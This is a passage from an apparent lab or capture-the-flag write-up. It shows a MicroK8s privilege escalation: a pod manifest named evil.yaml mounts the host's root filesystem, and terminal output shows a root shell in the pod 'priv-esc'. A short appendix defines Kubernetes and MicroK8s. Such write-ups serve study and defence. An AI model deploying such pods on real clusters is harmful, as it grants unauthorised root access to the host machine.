    image: localhost:32000/bsnginx
    command:
      - "/bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /mnt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory

frank@dev-01:~/repos/dk-ml$ microk8s kubectl apply -f evil.yaml
pod/priv-esc created

frank@dev-01:~/repos/dk-ml$ microk8s kubectl exec -it priv-esc -- /bin/bash
root@priv-esc:/# whoami
root
root@priv-esc:/# id
uid=0(root) gid=0(root) groups=0(root)
root@priv-esc:/# pwd
/
root@priv-esc:/# 

```

# Appendix

## Kubernetes

<aside>
💡

Kubernetes, often abbreviated as K8s, is an open-source container orchestration platform designed to automate the deployment, scaling, and management of containerized applications. Originally developed by Google, Kubernetes is now maintained by the Cloud Native Computing Foundation (CNCF).

</aside>

## Microk8s

<aside>
💡

MicroK8s is a lightweight, fast, and production-grade Kubernetes distribution developed by Canonical, the makers of Ubuntu. It is designed to be simple to install and easy to use, making it ideal for developers, edge deployments, IoT, and local Kubernetes environments. MicroK8s is particularly suited for users who want a minimal, self-contained Kubernetes environment without the complexity of managing a full cluster.

</aside>